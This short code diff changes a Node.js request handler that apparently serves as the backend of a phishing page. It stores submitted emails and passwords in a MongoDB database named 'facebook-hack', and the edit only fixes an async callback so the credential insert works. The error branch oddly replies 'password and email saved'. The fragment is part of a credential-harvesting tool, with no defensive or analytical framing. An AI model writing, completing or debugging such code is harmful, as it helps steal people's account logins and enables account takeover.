@@ -16,10 +16,11 @@ const handler = async (req, res) => {
       })
 
       if (!client.isConnected()) {
-        client.connect().then(() => {
+        client.connect().then(async () => {
           await client.db('facebook-hack').collection('users').insertOne({ email, password })
         })
       }
+
     } catch (error) {
       console.log(error)
       res.status(400).json({ message: 'password and email saved' })
